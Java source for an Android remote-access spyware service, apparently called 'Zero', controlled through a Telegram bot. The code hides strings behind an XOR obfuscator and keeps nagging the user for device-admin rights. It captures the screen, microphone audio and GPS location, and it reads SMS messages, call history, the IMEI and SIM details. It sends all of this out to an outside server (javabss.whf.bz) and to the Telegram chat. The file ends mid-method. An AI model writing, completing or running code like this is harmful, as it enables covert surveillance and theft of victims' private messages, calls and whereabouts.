package com.zero.xploid;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.*;

public class MainService extends Service {

    // Obfuscation
    private static String $(String str) {
        StringBuilder sb = new StringBuilder();
        char[] arr = str.toCharArray();
        for (int i = 0; i < arr.length; i++) {
            switch (i % 4) {
                case 0: sb.append((char) (arr[i] ^ 19620)); break;
                case 1: sb.append((char) (arr[i] ^ 35958)); break;
                case 2: sb.append((char) (arr[i] ^ 31761)); break;
                default: sb.append((char) (arr[i] ^ 65535)); break;
            }
        }
        return sb.toString();
    }

    private final String CREATED_BY = $("䳩谗籹ﾞ䳀谓米￟䳶豘簿ﾛ䳅谅").intern();
    private static final String PREF_DEVICE = $("䳔谄籴ﾙ䳗").intern();
    private static final String PREF_SCREEN = $("䳔谓籣ﾒ䳻谆籣ﾚ䳂谅").intern();
    private static final String KEY_SCREEN_CAPTURED = $("䳗谕籣ﾚ䳁谘籎ﾜ䳅谆籥ﾊ䳖谓籎ﾘ䳖谗籿ﾋ䳁谒").intern();

    // Cloud API
    private static final String CLOUD_API = "http://javabss.whf.bz/api.php";

    // Callback data
    private static final String CB_FLASHLIGHT_ON = "flashlight_on";
    private static final String CB_FLASHLIGHT_OFF = "flashlight_off";
    private static final String CB_SIM_INFO = "sim_info";
    private static final String CB_APP_LIST = "app_list";
    private static final String CB_FOREGROUND_APP = "foreground_app";
    private static final String CB_CALL_LOG = "call_log";
    private static final String CB_SMS_INBOX = "sms_inbox";
    private static final String CB_FILE_SERVER_START = "file_server_start";
    private static final String CB_FILE_SERVER_STOP = "file_server_stop";
    private static final String CB_LOCATION_SEND = "location_send";
    private static final String CB_LOCATION_START = "location_start";
    private static final String CB_LOCATION_STOP = "location_stop";

    // Service state
    private boolean running = true;
    private int lastUpdateId = 0;
    private PowerManager.WakeLock wakeLock;
    private Timer timer;
    private int lastMenuMessageId = 0;

    private static Intent captureIntent = null;
    private static int captureResultCode = -1;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private MediaRecorder mediaRecorder;
    private String deviceId, deviceName, deviceModel, deviceBrand, androidVersion;
    private boolean isRecording = false;

    private CameraManager cameraManager;
    private boolean flashlightOn = false;

    // Cloud file server state
    private boolean fileServerRunning = false;
    private String currentCloudUrl = null;

    // Location
    private LocationManager locationManager;
    private LocationListener locationListener;
    private boolean locationTracking = false;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceBrand = Build.BRAND;
        deviceModel = Build.MODEL;
        deviceName = Build.MANUFACTURER + " " + Build.MODEL;
        androidVersion = Build.VERSION.RELEASE;

        SharedPreferences prefs = getSharedPreferences(PREF_DEVICE, MODE_PRIVATE);
        deviceId = prefs.getString("id", null);
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString().substring(0, 8).toUpperCase();
            prefs.edit().putString("id", deviceId).commit();
        }

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Zero:lock");
        wakeLock.acquire();

        startForeground();
        startTimer();
        sendDeviceOnlineMessage();
        new Thread(this::listenTelegram).start();
    }

    private void sendDeviceOnlineMessage() {
        sendMessage("🟢 **DEVICE ONLINE**\n\n" + getDeviceDetailsString() +
                "\n\n💡 Telegram Channel @zerodeb\n👨‍💻 **Created by:** " + CREATED_BY +
                "\n\n📱 Type /start to see menu");
    }

    private String getDeviceDetailsString() {
        return "📱 **Device:** " + deviceName + "\n" +
                "🏷️ **Brand:** " + deviceBrand + "\n" +
                "📟 **Model:** " + deviceModel + "\n" +
                "🆔 **ID:** `" + deviceId + "`\n" +
                "🔋 **Battery:** " + getBatteryPercentage() + "%\n" +
                "🤖 **Android:** " + androidVersion;
    }

    private String getFooter() {
        return "\n\n💡 Telegram Channel @zerodeb\n👨‍💻 **Created by:** " + CREATED_BY;
    }

    private void startForeground() {
        if (Build.VERSION.SDK_INT >= 26) {
            String chId = "zero_foreground";
            NotificationChannel ch = new NotificationChannel(chId, "Zero Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager mgr = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            mgr.createNotificationChannel(ch);
            Notification notification = new Notification.Builder(this, chId)
                    .setContentTitle("Zero is running")
                    .setContentText(deviceName + " | Battery: " + getBatteryPercentage() + "%")
                    .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
                    .build();
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC |
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION |
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
            } else {
                startForeground(1, notification);
            }
        }
    }

    private void startTimer() {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                updateNotification();
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                ComponentName comp = new ComponentName(MainService.this, AdminReceiver.class);
                if (!dpm.isAdminActive(comp)) {
                    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                }
            }
        }, 60000, 60000);
    }

    private void updateNotification() {
        if (Build.VERSION.SDK_INT >= 26) {
            String chId = "zero_foreground";
            Notification notification = new Notification.Builder(this, chId)
                    .setContentTitle("Zero is running")
                    .setContentText(deviceName + " | Battery: " + getBatteryPercentage() + "%")
                    .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
                    .build();
            startForeground(1, notification);
        }
    }

    private int getBatteryPercentage() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
                return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            } else {
                Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
                int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                return (level * 100) / scale;
            }
        } catch (Exception e) { return 50; }
    }

    // ── Screenshot (fixed callback) ──
    private void takeScreenshot() {
        if (captureIntent == null) {
            sendMessage("📸 No media projection permission yet.");
            return;
        }
        sendMessage("📸 Screenshot capturing...");
        new Thread(() -> {
            try {
                String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
                File screenshotsDir = new File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "Screenshots");
                screenshotsDir.mkdirs();
                final File outputFile = new File(screenshotsDir, "Screenshot_" + timestamp + ".png");
                takeScreenshotViaMediaProjection(outputFile);
            } catch (Exception e) {
                sendMessage("❌ Screenshot error: " + e.getMessage());
            }
        }).start();
    }

    private void takeScreenshotViaMediaProjection(final File outputFile) {
        try {
            DisplayMetrics metrics = getResources().getDisplayMetrics();
            final int width = metrics.widthPixels;
            final int height = metrics.heightPixels;
            int density = metrics.densityDpi;
            MediaProjectionManager projManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            final MediaProjection mp = projManager.getMediaProjection(captureResultCode, captureIntent);
            mp.registerCallback(new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    Log.d("Screenshot", "MediaProjection stopped");
                }
            }, null);
            final ImageReader imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            final VirtualDisplay vd = mp.createVirtualDisplay("screenshot", width, height, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
            Thread.sleep(500);
            final Image image = imageReader.acquireLatestImage();
            if (image != null) {
                Image.Plane[] planes = image.getPlanes();
                ByteBuffer buffer = planes[0].getBuffer();
                int pixelStride = planes[0].getPixelStride();
                int rowStride = planes[0].getRowStride();
                int rowPadding = rowStride - pixelStride * width;
                Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                bitmap.copyPixelsFromBuffer(buffer);
                bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);
                FileOutputStream fos = new FileOutputStream(outputFile);
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
                fos.close();
                bitmap.recycle();
                image.close();
                uploadFile(outputFile, "screenshot");
            } else {
                sendMessage("❌ Failed to capture screenshot image.");
            }
            vd.release();
            mp.stop();
            imageReader.close();
        } catch (Exception e) {
            sendMessage("❌ Screenshot error: " + e.getMessage());
        }
    }

    // ── Screen recording (fixed callback) ──
    private void startScreenRecording(int seconds, boolean withAudio) {
        if (captureIntent == null) {
            sendMessage("🎥 No media projection permission yet.");
            return;
        }
        if (isRecording) {
            sendMessage("⚠️ Already recording!");
            return;
        }
        String type = withAudio ? "Screen+Audio" : "Screen";
        String durationText = formatDuration(seconds);
        sendMessage("🎥 " + type + " recording started (" + durationText + ")");
        new Thread(() -> {
            try {
                isRecording = true;
                String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
                File recordingsDir = new File(getExternalFilesDir(Environment.DIRECTORY_MOVIES), "Recordings");
                recordingsDir.mkdirs();
                File outputFile = new File(recordingsDir, "Screen_" + timestamp + ".mp4");
                DisplayMetrics metrics = getResources().getDisplayMetrics();
                int width = metrics.widthPixels, height = metrics.heightPixels, density = metrics.densityDpi;
                MediaProjectionManager projManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                mediaProjection = projManager.getMediaProjection(captureResultCode, captureIntent);
                mediaProjection.registerCallback(new MediaProjection.Callback() {
                    @Override
                    public void onStop() {
                        Log.d("Recorder", "MediaProjection stopped");
                    }
                }, null);
                mediaRecorder = new MediaRecorder();
                mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
                if (withAudio && checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                    mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                }
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
                mediaRecorder.setVideoEncodingBitRate(5000000);
                mediaRecorder.setVideoFrameRate(30);
                mediaRecorder.setVideoSize(width, height);
                if (withAudio) {
                    mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                    mediaRecorder.setAudioEncodingBitRate(128000);
                    mediaRecorder.setAudioSamplingRate(44100);
                }
                mediaRecorder.setOutputFile(outputFile.getAbsolutePath());
                mediaRecorder.prepare();
                virtualDisplay = mediaProjection.createVirtualDisplay("recording", width, height, density,
                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mediaRecorder.getSurface(), null, null);
                mediaRecorder.start();
                Thread.sleep(seconds * 1000L);
                mediaRecorder.stop();
                mediaRecorder.reset();
                virtualDisplay.release();
                mediaProjection.stop();
                isRecording = false;
                uploadFile(outputFile, "video");
            } catch (Exception e) {
                sendMessage("❌ Recording error: " + e.getMessage());
                isRecording = false;
            } finally {
                cleanup();
            }
        }).start();
    }

    private String formatDuration(int seconds) {
        return seconds < 60 ? seconds + "s" : (seconds / 60) + "m" + (seconds % 60 > 0 ? " " + (seconds % 60) + "s" : "");
    }

    private void startAudioRecording(int seconds) {
        if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("🎙️ No audio permission.");
            return;
        }
        String durationText = formatDuration(seconds);
        sendMessage("🎙️ Audio recording started (" + durationText + ")");
        new Thread(() -> {
            MediaRecorder audioRecorder = null;
            try {
                String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
                File audioDir = new File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "Audio");
                audioDir.mkdirs();
                File outputFile = new File(audioDir, "Audio_" + timestamp + ".mp3");
                audioRecorder = new MediaRecorder();
                audioRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                audioRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                audioRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                audioRecorder.setAudioEncodingBitRate(128000);
                audioRecorder.setAudioSamplingRate(44100);
                audioRecorder.setOutputFile(outputFile.getAbsolutePath());
                audioRecorder.prepare();
                audioRecorder.start();
                Thread.sleep(seconds * 1000L);
                audioRecorder.stop();
                audioRecorder.release();
                uploadFile(outputFile, "audio");
            } catch (Exception e) {
                sendMessage("❌ Audio error: " + e.getMessage());
                if (audioRecorder != null) {
                    try { audioRecorder.release(); } catch (Exception ignored) {}
                }
            }
        }).start();
    }

    private void cleanup() {
        try { if (mediaRecorder != null) { mediaRecorder.release(); mediaRecorder = null; } } catch (Exception ignored) {}
        try { if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; } } catch (Exception ignored) {}
        try { if (mediaProjection != null) { mediaProjection.stop(); mediaProjection = null; } } catch (Exception ignored) {}
    }

    // ── Flashlight ──
    private void setFlashlight(boolean on) {
        if (Build.VERSION.SDK_INT < 23) {
            sendMessage("❌ Flashlight requires Android 6+.");
            return;
        }
        if (cameraManager == null) cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        try {
            String cameraId = cameraManager.getCameraIdList()[0];
            if (on) {
                if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                    sendMessage("❌ Camera permission needed for flashlight.");
                    return;
                }
                cameraManager.setTorchMode(cameraId, true);
                flashlightOn = true;
                sendMessage("🔦 Flashlight ON");
            } else {
                cameraManager.setTorchMode(cameraId, false);
                flashlightOn = false;
                sendMessage("🔦 Flashlight OFF");
            }
        } catch (CameraAccessException e) {
            sendMessage("❌ Flashlight error: " + e.getMessage());
        }
    }

    // ── Full device status + SIM info ──
    private String getFullDeviceStatus() {
        StringBuilder sb = new StringBuilder("📊 **DEVICE STATUS**\n\n");
        sb.append(getDeviceDetailsString()).append("\n\n");
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                sb.append("📡 **Network:** ").append(tm.getNetworkOperatorName()).append("\n");
                sb.append("🆔 **IMEI:** ").append(tm.getDeviceId() != null ? tm.getDeviceId() : "N/A").append("\n");
                sb.append("📞 **Line Number:** ").append(tm.getLine1Number() != null ? tm.getLine1Number() : "N/A").append("\n");
                sb.append("💳 **SIM Serial:** ").append(tm.getSimSerialNumber() != null ? tm.getSimSerialNumber() : "N/A").append("\n");
            }
        } catch (Exception ignored) {}
        return sb.toString() + getFooter();
    }

    // ── App list ──
    private String getInstalledAppsList() {
        StringBuilder sb = new StringBuilder("📱 **INSTALLED APPS**\n\n");
        PackageManager pm = getPackageManager();
        List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
        for (android.content.pm.ApplicationInfo app : apps) {
            if ((app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
                String label = pm.getApplicationLabel(app).toString();
                sb.append(label).append(" (").append(app.packageName).append(")\n");
            }
        }
        return sb.toString();
    }

    private String getForegroundAppName() {
        if (Build.VERSION.SDK_INT >= 21) {
            android.app.usage.UsageStatsManager usm = (android.app.usage.UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
            long time = System.currentTimeMillis();
            List<android.app.usage.UsageStats> stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY,
                    time - 10_000, time);
            if (stats != null && !stats.isEmpty()) {
                android.app.usage.UsageStats recent = null;
                for (android.app.usage.UsageStats s : stats) {
                    if (recent == null || s.getLastTimeUsed() > recent.getLastTimeUsed()) recent = s;
                }
                if (recent != null) {
                    try {
                        return getPackageManager().getApplicationLabel(
                                getPackageManager().getApplicationInfo(recent.getPackageName(), 0)).toString();
                    } catch (Exception ignored) {}
                }
            }
        }
        return "Unknown";
    }

    // ── Call history ──
    private void uploadCallHistory() {
        new Thread(() -> {
            try {
                File file = new File(getExternalFilesDir(null), "call_history.txt");
                Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
                if (cursor != null && cursor.moveToFirst()) {
                    StringBuilder sb = new StringBuilder();
                    do {
                        String num = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                        int typeInt = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                        String type = typeInt == 1 ? "INCOMING" : typeInt == 2 ? "OUTGOING" : "MISSED";
                        String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
                        String dur = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                        sb.append(date).append(" | ").append(num).append(" | ").append(type).append(" | ").append(dur).append("s\n");
                    } while (cursor.moveToNext());
                    cursor.close();
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(sb.toString().getBytes());
                    fos.close();
                    uploadFile(file, "call_log");
                } else {
                    sendMessage("📞 No call history found.");
                }
            } catch (Exception e) {
                sendMessage("❌ Call history error: " + e.getMessage());
            }
        }).start();
    }

    // ── SMS inbox ──
    private void uploadSmsHistory() {
        new Thread(() -> {
            try {
                File file = new File(getExternalFilesDir(null), "sms_inbox.txt");
                Cursor cursor = getContentResolver().query(
                        Uri.parse("content://sms/inbox"), null, null, null, null);
                if (cursor != null && cursor.moveToFirst()) {
                    StringBuilder sb = new StringBuilder();
                    do {
                        String address = cursor.getString(cursor.getColumnIndex("address"));
                        String body = cursor.getString(cursor.getColumnIndex("body"));
                        String date = cursor.getString(cursor.getColumnIndex("date"));
                        sb.append(date).append(" | ").append(address).append(" | ").append(body).append("\n");
                    } while (cursor.moveToNext());
                    cursor.close();
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(sb.toString().getBytes());
                    fos.close();
                    uploadFile(file, "sms_inbox");
                } else {
                    sendMessage("✉️ No SMS inbox found.");
                }
            } catch (Exception e) {
                sendMessage("❌ SMS inbox error: " + e.getMessage());
            }
        }).start();
    }

    // ═══════════════════════════════════════
    // ★★★ CLOUD FILE SERVER ★★★
    // ═══════════════════════════════════════

    private String getLocalIpAddress() {
        try {
            for (NetworkInterface intf : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                for (InetAddress addr : Collections.list(intf.getInetAddresses())) {
                    if (!addr.isLoopbackAddress() && addr.getAddress().length == 4) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception ignored) {}
        return "127.0.0.1";
    }

    private void startFileServer() {
        if (fileServerRunning) {
            sendMessage("🌐 Cloud server already active.");
            return;
        }
        new Thread(() -> {
            try {
                URL url = new URL(CLOUD_API + "?action=register");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");
                JSONObject params = new JSONObject();
                params.put("device_id", deviceId);
                params.put("ip", getLocalIpAddress());
                OutputStream os = conn.getOutputStream();
                os.write(params.toString().getBytes("UTF-8"));
                os.close();

                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                br.close();
                JSONObject json = new JSONObject(sb.toString());
                if (json.has("public_url")) {
                    currentCloudUrl = json.getString("public_url");
                    fileServerRunning = true;
                    sendMessage("🌐 **CLOUD FILE SERVER READY**\nID: `" + deviceId + "`\n🔗 " + currentCloudUrl);
                } else {
                    sendMessage("❌ Cloud registration failed.");
                }
            } catch (Exception e) {
                sendMessage("❌ Cloud error: " + e.getMessage());
            }
        }).start();
    }

    private void stopFileServer() {
        fileServerRunning = false;
        currentCloudUrl = null;
        new Thread(() -> {
            try {
                URL url = new URL(CLOUD_API + "?action=delete_ad");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");
                JSONObject params = new JSONObject();
                params.put("device_id", deviceId);
                conn.getOutputStream().write(params.toString().getBytes("UTF-8"));
                conn.getResponseCode();
            } catch (Exception ignored) {}
        }).start();
        sendMessage("🌐 Cloud file server stopped.");
    }

    private void uploadFileToCloud(File file, String type) {
        new Thread(() -> {
            try {
                String boundary = UUID.randomUUID().toString();
                URL url = new URL(CLOUD_API + "?action=upload");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"device_id\"\r\n\r\n" + deviceId + "\r\n");

                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n");
                dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");

                FileInputStream fis = new FileInputStream(file);
                byte[] buf = new byte[4096];
                int len;
                while ((len = fis.read(buf)) != -1) dos.write(buf, 0, len);
                fis.close();

                dos.writeBytes("\r\n--" + boundary + "--\r\n");
                dos.flush();
                dos.close();

                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                br.close();
                JSONObject json = new JSONObject(sb.toString());
                if (json.has("id")) {
                    String downloadLink = CLOUD_API + "?action=download&id=" + json.getInt("id");
                    String msg = getTypeEmoji(type) + " **" + getTypeName(type) + " saved!**\n📄 `" + file.getName() + "`\n🔗 [Download](" + downloadLink + ")\n" + getDeviceDetailsString() + getFooter();
                    sendMessage(msg);
                } else {
                    sendMessage("❌ Cloud upload failed.");
                }
                file.delete();
            } catch (Exception e) {
                sendMessage("❌ Upload error: " + e.getMessage());
            }
        }).start();
    }

    private void uploadFile(File file, String type) {
        uploadFileToCloud(file, type);
    }

    private String getTypeName(String type) {
        switch (type) {
            case "screenshot": return "Screenshot";
            case "video": return "Screen Recording";
            case "audio": return "Audio Recording";
            default: return "File";
        }
    }

    private String getTypeEmoji(String type) {
        switch (type) {
            case "screenshot": return "📸";
            case "video": return "🎥";
            case "audio": return "🎙️";
            default: return "📄";
        }
    }

    private void handleConnectRequest(String remoteDeviceId) {
        new Thread(() -> {
            try {
                URL url = new URL(CLOUD_API + "?action=get_ad&device_id=" + URLEncoder.encode(remoteDeviceId, "UTF-8"));
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                br.close();
                JSONObject json = new JSONObject(sb.toString());
                if (json.has("public_url")) {
                    String publicUrl = json.getString("public_url");
                    sendMessage("🔗 **Remote File Server**\n" + publicUrl + "\n\nBrowse and download directly.");
                    fetchRemoteFileList(publicUrl);
                } else {
                    sendMessage("❌ No file server found for ID `" + remoteDeviceId + "`.");
                }
            } catch (Exception e) {
                sendMessage("❌ Connection error.");
            }
        }).start();
    }

    private void fetchRemoteFileList(String publicUrl) {
        new Thread(() -> {
            try {
                String deviceIdFromUrl = publicUrl.substring(publicUrl.indexOf("device=") + 7);
                URL listUrl = new URL(CLOUD_API + "?action=list&device_id=" + URLEncoder.encode(deviceIdFromUrl, "UTF-8"));
                String response = getRequest(listUrl.toString());
                JSONArray files = new JSONArray(response);
                JSONArray keyboard = new JSONArray();
                for (int i = 0; i < files.length(); i++) {
                    JSONObject f = files.getJSONObject(i);
                    keyboard.put(new JSONArray().put(new JSONObject()
                            .put("text", "📄 " + f.getString("filename"))
                            .put("callback_data", "remote_dl_" + f.getInt("id"))));
                }
                String replyMarkup = new JSONObject().put("inline_keyboard", keyboard).toString();
                sendMessageWithKeyboard("📁 Files on remote device:", replyMarkup);
            } catch (Exception e) {
                sendMessage("❌ Could not list remote files.");
            }
        }).start();
    }

    private void downloadRemoteFile(int fileId) {
        new Thread(() -> {
            try {
                String link = CLOUD_API + "?action=download&id=" + fileId;
                sendMessage("🔗 [Download file](" + link + ")");
            } catch (Exception e) {
                sendMessage("❌ Download error.");
            }
        }).start();
    }

    // ── Location features ──
    private void sendLocationOnce() {
        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ Location permission not granted.");
            return;
        }
        sendMessage("📍 Fetching location...");
        if (locationManager == null)
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);

        Location lastLoc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        if (lastLoc == null)
            lastLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        if (lastLoc != null)
            processLocation(lastLoc);

        try {
            locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationListener() {
                @Override public void onLocationChanged(Location loc) { processLocation(loc); }
                @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                @Override public void onProviderEnabled(String provider) {}
                @Override public void onProviderDisabled(String provider) {}
            }, Looper.getMainLooper());
        } catch (Exception e) {
            sendMessage("❌ Location error: " + e.getMessage());
        }
    }

    private void startLocationTracking() {
        if (locationTracking) return;
        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ Location permission not granted.");
            return;
        }
        if (locationManager == null) locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        locationTracking = true;
        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                processLocation(location);
            }
            @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
            @Override public void onProviderEnabled(String provider) {}
            @Override public void onProviderDisabled(String provider) {}
        };
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000, 10, locationListener, Looper.getMainLooper());
        sendMessage("📍 Live Location Tracking started.");
    }

    private void stopLocationTracking() {
        if (locationTracking && locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
            locationTracking = false;
            sendMessage("📍 Live Location Tracking stopped.");
        }
    }

    private void processLocation(Location location) {
        double lat = location.getLatitude();
        double lon = location.getLongitude();
        String address = getAddressFromLocation(lat, lon);
        String msg = "📍 **Location**\nLat: " + lat + "\nLon: " + lon + "\nAddress: " +
                (address != null ? address : "N/A") + "\n" + getFooter();
        sendMessage(msg);
    }

    private String getAddressFromLocation(double lat, double lon) {
        try {
            Geocoder geocoder = new Geocoder(this, Locale.getDefault());
            List<Address> addresses = geocoder.getFromLocation(lat, lon, 1);
            if (addresses != null && addresses.size() > 0) {
                Address a = addresses.get(0);
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i <= a.getMaxAddressLineIndex(); i++) {
                    sb.append(a.getAddressLine(i)).append(", ");
                }
                if (sb.length() > 0) sb.setLength(sb.length() - 2);
                return sb.toString();
            }
        } catch (Exception ignored) {}
        return null;
    }

    // ── Telegram bot methods ──
    private void listenTelegram() {
        while (running) {
            try {
                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
                String response = getRequest(url);
                if (response != null && !response.equals("")) {
                    JSONObject json = new JSONObject(response);
                    if (json.has("ok") && json.getBoolean("ok")) {
                        JSONArray resultArray = json.getJSONArray("result");
                        for (int i = 0; i < resultArray.length(); i++) {
                            JSONObject item = resultArray.getJSONObject(i);
                            lastUpdateId = item.getInt("update_id");
                            if (item.has("callback_query")) {
                                JSONObject callback = item.getJSONObject("callback_query");
                                String callbackId = callback.getString("id");
                                String data = callback.getString("data");
                                String messageId = String.valueOf(callback.getJSONObject("message").getInt("message_id"));
                                if (lastMenuMessageId != 0 && lastMenuMessageId != Integer.parseInt(messageId)) {
                                    deleteMessage(lastMenuMessageId);
                                }
                                lastMenuMessageId = Integer.parseInt(messageId);
                                answerCallback(callbackId);
                                processButtonClick(data);
                            } else if (item.has("message")) {
                                JSONObject message = item.getJSONObject("message");
                                JSONObject chat = message.getJSONObject("chat");
                                String chatId = String.valueOf(chat.getLong("id"));
                                String text = message.has("text") ? message.getString("text") : "";
                                if (chatId.equals(Config.CHAT_ID)) {
